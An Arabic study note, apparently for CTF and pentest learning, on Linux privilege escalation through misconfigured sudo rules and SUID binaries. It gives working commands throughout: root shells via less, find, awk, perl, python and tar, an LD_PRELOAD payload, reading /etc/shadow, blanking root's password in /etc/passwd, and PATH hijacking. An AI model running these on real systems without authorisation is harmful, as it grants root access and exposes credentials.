# ๐ฅ **1. ุงุณุชุบูุงู ุฃูุงูุฑ sudo (Abusing Sudo Privileges)**

### ๐ฅ **ููุฏูุฉ**

ูู ุฃูุธูุฉ **ูููููุณ**ุ ูุชู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช ุจุงุณุชุฎุฏุงู ุฃูุงูุฑ ูุซู `sudo`. ูู ุจุนุถ ุงูุฃุญูุงูุ ูุชู ุชูููู `sudo` ุจุทุฑููุฉ ุบูุฑ ุขููุฉุ ููุง ูุณูุญ ูููุณุชุฎุฏููู ุจุงุณุชุบูุงูู **ูุฑูุน ุงูุตูุงุญูุงุช ุฅูู root**.  
ููููู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช ุงูุชู ูุฏูู ุจุงุณุชุฎุฏุงู:

```bash
sudo -l
```

ูุนุฑุถ ูุฐุง ุงูุฃูุฑ ูุงุฆูุฉ ุจุงูุฃูุงูุฑ ุงูุชู ููููู ุชุดุบูููุง ุจุงุณุชุฎุฏุงู `sudo`.

---

# ๐น **1. ุงุณุชุบูุงู `sudo` ูุชุดุบูู ุฃูุงูุฑ ุจุฏูู ูููุฉ ูุฑูุฑ**

๐ธ ุฅุฐุง ุฃุธูุฑ `sudo -l` ุดูุฆูุง ูุซู:

```bash
(ALL) NOPASSWD: /bin/cat
```

ููุฐุง ูุนูู ุฃูู ููููู ุชุดุบูู `cat` ุจุฏูู ูููุฉ ูุฑูุฑ. ููููู ุงูุขู ูุฑุงุกุฉ ุฃู ููู ูุญูู ูุซู `/etc/shadow` ุจุงุณุชุฎุฏุงู:

```bash
sudo cat /etc/shadow
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: ููููู ุงุณุชุฎุฑุงุฌ ุชุฌุฒุฆุฉ ูููุงุช ุงููุฑูุฑ ููุญุงููุฉ ูุณุฑูุง ุจุงุณุชุฎุฏุงู **John the Ripper** ุฃู **Hashcat**.

---

# ๐น **2. ุงุณุชุบูุงู `sudo` ูุชุดุบูู `bash` ูู root**

๐ธ ุฅุฐุง ููุช ุชุณุชุทูุน ุชุดุบูู `bash` ุจุงุณุชุฎุฏุงู `sudo` ูุซู:

```bash
(ALL) NOPASSWD: /bin/bash
```

๐น ููููู ูุชุญ **shell root** ูุจุงุดุฑุฉู ุจุงุณุชุฎุฏุงู:

```bash
sudo bash
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: ูุนุทูู ูุตูููุง ูุงูููุง ูููุธุงู.

---

# ๐น **3. ุงุณุชุบูุงู `sudo` ุนูุฏ ุงูุณูุงุญ ุจุฃูุงูุฑ ูุซู `less` ุฃู `vi`**

๐ธ ุจุนุถ ุงูุฃูุงูุฑ ูุซู `less` ู `vi` ุชุณูุญ ุจุชูููุฐ ุฃูุงูุฑ ุฏุงุฎููุง. ุฅุฐุง ูุงู ูุฏูู ุงูุตูุงุญูุงุช ุงูุชุงููุฉ:

```bash
(ALL) NOPASSWD: /usr/bin/less
```

๐น ููููู ุชุดุบูู `less`ุ ุซู ูุชุญ **shell root** ูุงูุชุงูู:

```bash
sudo less /etc/shadow
!bash
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: ููููู ุชุดุบูู ุฃูุงูุฑ ุจุตูุงุญูุงุช `root` ูู ุฏุงุฎู `less`.

---

# ๐น **4. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `find`**

๐ธ ุฅุฐุง ูุงู `sudo -l` ูุนุฑุถ:

```bash
(ALL) NOPASSWD: /usr/bin/find
```

๐น ููููู ูุชุญ shell ูู root ุจุงุณุชุฎุฏุงู:

```bash
sudo find . -exec /bin/bash \;
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: `find` ูุณูุญ ุจุชูููุฐ ุฃูุงูุฑุ ููุง ูุณูู ุงูุญุตูู ุนูู ุตูุงุญูุงุช `root`.

---

# ๐น **5. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `awk`**

๐ธ ุฅุฐุง ูุงู ูุฏูู ุงูุตูุงุญูุฉ ูุชุดุบูู `awk`:

```bash
(ALL) NOPASSWD: /usr/bin/awk
```

๐น ููููู ุชุดุบูู shell ุจุตูุงุญูุงุช root:

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: `awk` ููููู ุชูููุฐ ุฃูุงูุฑ ุฏุงุฎู `BEGIN`.

---

# ๐น **6. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `perl`**

๐ธ ุฅุฐุง ูุงู ูุฏูู ุฅุฐู ุชุดุบูู `perl`:

```bash
(ALL) NOPASSWD: /usr/bin/perl
```

๐น ููููู ูุชุญ shell ูู root ุจุงุณุชุฎุฏุงู:

```bash
sudo perl -e 'exec "/bin/bash";'
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: `perl` ูุณูุญ ุจุชูููุฐ ุฃููุงุฏ ุจุฑูุฌูุฉ ูุจุงุดุฑุฉ.

---

# ๐น **7. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `python`**

๐ธ ุฅุฐุง ูุงู ูุฏูู ุงูุตูุงุญูุฉ ูุชุดุบูู `python`:

```bash
(ALL) NOPASSWD: /usr/bin/python3
```

๐น ููููู ุชุดุบูู shell ูู root ุจุงุณุชุฎุฏุงู:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```



โ๏ธ **ุงูุฎุทูุฑุฉ**: `python` ููููู ุชุดุบูู ุฃูุงูุฑ ูุจุงุดุฑุฉ ุจุตูุงุญูุงุช root.

---

# ๐น **8. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `tar`**

๐ธ ุฅุฐุง ูุงู ูุฏูู ุงูุตูุงุญูุฉ ูุชุดุบูู `tar`:

```bash
(ALL) NOPASSWD: /bin/tar
```

๐น ููููู ูุชุญ shell ุจุตูุงุญูุงุช root:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: `tar` ูุณูุญ ุจุชูููุฐ ุฃูุงูุฑ ุนูุฏ ููุทุฉ ูุนููุฉ.

---

# ๐น **9. ุงุณุชุบูุงู `sudo` ุจุงุณุชุฎุฏุงู `LD_PRELOAD`**

๐ธ ุจุนุถ ุงูุฃูุธูุฉ ุชุณูุญ ุจุชุญููู ููุชุจุงุช ูุฎุตุตุฉ ุนูุฏ ุชุดุบูู `sudo`. ุฅุฐุง ูุงู `env_keep` ููุนูุงูุ ูููููุง ุงุณุชุบูุงู `LD_PRELOAD` ููุง ููู:

## **๐ ุงูุฎุทูุงุช**

1๏ธโฃ **ุฅูุดุงุก ููุฏ C ููุชุญ ุดู root**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2๏ธโฃ **ุชุฑุฌูุฉ ุงูููุฏ ุฅูู ููุชุจุฉ `.so`**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3๏ธโฃ **ุชุดุบูู ุงูุจุฑูุงูุฌ ุจุตูุงุญูุงุช `sudo` ูุน `LD_PRELOAD`**

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: ุณูุชู ุชุญููู ููุชุจุฉ `.so`ุ ููุง ูุณูุญ ูู ุจุงูุญุตูู ุนูู **root shell**.

---

# **๐น 10. ุงุณุชุบูุงู `sudo` ูุชุนุฏูู `/etc/passwd`**

๐ธ ุฅุฐุง ููุช ุชุณุชุทูุน ุชุดุบูู `vim` ุฃู `nano` ุจุงุณุชุฎุฏุงู `sudo`ุ ููููู ุชุนุฏูู `/etc/passwd` ูุฅุถุงูุฉ ูุณุชุฎุฏู root ุฌุฏูุฏ.

## **๐ ุงูุฎุทูุงุช**

1๏ธโฃ **ุงูุชุญ `/etc/passwd` ุจุงุณุชุฎุฏุงู `vim` ุฃู `nano`**

```bash
sudo vim /etc/passwd
```

2๏ธโฃ **ุงุจุญุซ ุนู ุงูุณุทุฑ ุงูุฎุงุต ุจู `root` ูุนุฏูู ููุตุจุญ:**

```
root::0:0:root:/root:/bin/bash
```

3๏ธโฃ **ุงุญูุธ ุงููููุ ุซู ุงูุชูู ุฅูู root**

```bash
su root
```

โ๏ธ **ุงูุฎุทูุฑุฉ**: ููููู ุฅูุดุงุก ูุณุชุฎุฏู root ุฌุฏูุฏ ุจุฏูู ุงูุญุงุฌุฉ ุฅูู ูููุฉ ูุฑูุฑ.

---
### ูุงู :
ุฃูุงูุฑ ุชุงููุฉ ุฒู `find`ุ `awk`ุ `tar`ุ ู `zip` ูููู ููุณ ุงูุงุณุชุบูุงูุงุช. ูููู ุชุณุชุฎุฏู ูููุน **GTFOBins** ููุจุญุซ ุนู ุฃู ุฃูุฑ ุนูุฏู ูุชุดูู ุงุณุชุบูุงูู:  
[https://gtfobins.github.io/](https://gtfobins.github.io/)

### โ **ุงูุฎูุงุตุฉ ุจุงูุนุงููุฉ:**

ูู ุชูุฏุฑ ุชุดุบู ุฃูุงูุฑ ูุนููุฉ ุจู `sudo`ุ ุฏูุฑ ุนูู ุฃูุฑ ูููู ููุชุญ ูู Shell ุจุตูุงุญูุงุช **root**. ุงุณุชุฎุฏู `sudo -l` ูุดูู ูู ููู ุญุงุฌุฉ ุชูุฏุฑ ุชุณุชุบููุง.

---

# ๐ฅ **2. ุงุณุชุบูุงู ูููุงุช SUID (Abusing SUID Binaries)**

## ๐น **2.1 ุงูุจุญุซ ุนู ูููุงุช SUID**

ูุณุชุฎุฏู ุงูุฃูุฑ ุฏู ููุจุญุซ ุนู ูู ุงููููุงุช ุงููู ุนูููุง SUID:

```bash
find / -perm -4000 2>/dev/null
```

ุฏู ููุฌูุจ ูู ุงููููุงุช ุงููู ุจุชุดุชุบู ุจุตูุงุญูุงุช ุตุงุญุจูุง (ุบุงูุจูุง root).

## ๐น **2.2 ุงุณุชุบูุงู ููู SUID ุจูุดุบู ุฃูุงูุฑ**

ูู ูููุช ููู ุฒูู ุฒู `find` ุนูุฏู SUIDุ ุชูุฏุฑ ุชุดุบูู ูุงูุชุงูู:

```bash
/usr/bin/find . -exec /bin/bash -p \;
```

ูุฏู ูููุชุญ ูู Shell ุจุตูุงุญูุงุช root.

## ๐น **2.3 ูู ููู SUID ุจูุณุชุฏุนู ุฃูุฑ ุบูุฑ ุขูู**

ูู ุนูุฏู ููู `custom_script` ูุนุฑูุช ุฅูู ุจูุณุชุฏุนู `ls` ูุซููุง ุฌูุงูุ ุชูุฏุฑ ุชุนูู ุงูุชุงูู:

```bash
echo "/bin/sh" > ls
chmod +x ls
export PATH=.:$PATH
/custom_script
```

ูุฏู ููุดุบู Shell ุจุตูุงุญูุงุช root ูุฅูู ุจูุณุชุฎุฏู `ls` ูู ุงูู PATH ุงููู ุงูุช ุนุฏูุชู.

## โ **ุงูุฎูุงุตุฉ ุจุงูุนุงููุฉ:**

ูู ููู ููู ุนููู SUIDุ ุฌุฑุจ ุชุดูู ุจูุนูู ุฅููุ ููู ุจูุดุบู ุฃูุงูุฑุ ูููู ุชุฎููู ูุดุบู Shell ุจุตูุงุญูุงุช root.

---

# ๐ **ุฎุทูุงุช Pentesting ุนูููุฉ ูุงุณุชุบูุงู sudo ู SUID**

## ๐ฅ **1. ุงุณุชุบูุงู sudo (Privilege Escalation via Sudo)**

### โ **ุงูุฎุทูุงุช:**

1. ุดูู ุฅูู ุงูุฃูุงูุฑ ุงููู ุชูุฏุฑ ุชุดุบููุง ุจู `sudo`:
    
    ```bash
     sudo -l
    ```
ูู ุงููุชูุฌู ุทูุนุช ูุฏู 
![[Pasted image 20250315152254.png]]
ุงุนูู ุงูุงุชู

2. ูู ูููุช ุฃูุฑ ูููู ูุณุชุบูุ ุฌุฑุจ ุชุดุบูู Shell:
    
    ```bash
    sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
3. ูู ูููุช ุฃูุฑ ุจูุดุบู ูููุงุชุ ุฌุฑุจ ุชุนูู **Hijacking** ููููู ุงููู ุจูุดุบูู.

---

## ๐ฅ **2. ุงุณุชุบูุงู SUID (Privilege Escalation via SUID Binaries)**

### โ **ุงูุฎุทูุงุช:**

1. ุฏูุฑ ุนูู ูู ูููุงุช SUID:
    
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    
2. ุดูู ูู ููู ุฃูุฑ ูุนุฑูู ุนูุฏู SUIDุ ุฒู `find` ุฃู `vim` ุฃู `bash`:
    
    ```bash
    /usr/bin/find . -exec /bin/bash -p \;
    ```
    
3. ูู ุงูููู ุจูุณุชุฏุนู ุฃูุฑ ูุนููุ ุงุนูู **Hijacking** ุจุงุณุชุฎุฏุงู PATH Variable:
    
    ```bash
    echo "/bin/sh" > fake_ls
    chmod +x fake_ls
    export PATH=.:$PATH
    /custom_script
    ```
    

---

## ๐ฅ **ุงูุฎูุงุตุฉ ุงูุนุงูุฉ ุจุงูุนุงููุฉ:**

1. **sudo -l** ุฏู ุฃูู ุญุงุฌุฉ ุชุดูููุงุ ูู ุชูุฏุฑ ุชุดุบู ุญุงุฌุฉ ุจู sudo ุจุฏูู ุจุงุณูุฑุฏุ ุบุงูุจูุง ุชูุฏุฑ ุชูุตู ูู root.
2. **ูู ูููุช SUID file**ุ ุดูู ุจูุนูู ุฅููุ ูุฌุฑุจ ุชุดุบูู ุจุทุฑู ูุฎุชููุฉ.
3. **ูู ููู ุจูุณุชุฏุนู ุฃูุงูุฑ ุฎุงุฑุฌูุฉ**ุ ุญุงูู ุชูุนุจ ูู ุงูู PATH ูุชุฎููู ูุดุบู ุญุงุฌุฉ ุงูุช ุนุงูููุง ุจููุณู.

๐ก **ูุตูุญุฉ**: ูู ุจุชูุนุจ ูู CTF ุฃู ุจุชุนูู **Privilege Escalation**ุ ุฏุงูููุง ุฌุฑุจ **GTFOBins** ู `sudo -l` ู `find / -perm -4000` ูุฎุทูุงุช ุฃููู. ๐


# ุงุฎุชุจุฑ ุญูุธู : [[Abusing sudo and SUID binaries (Q).]]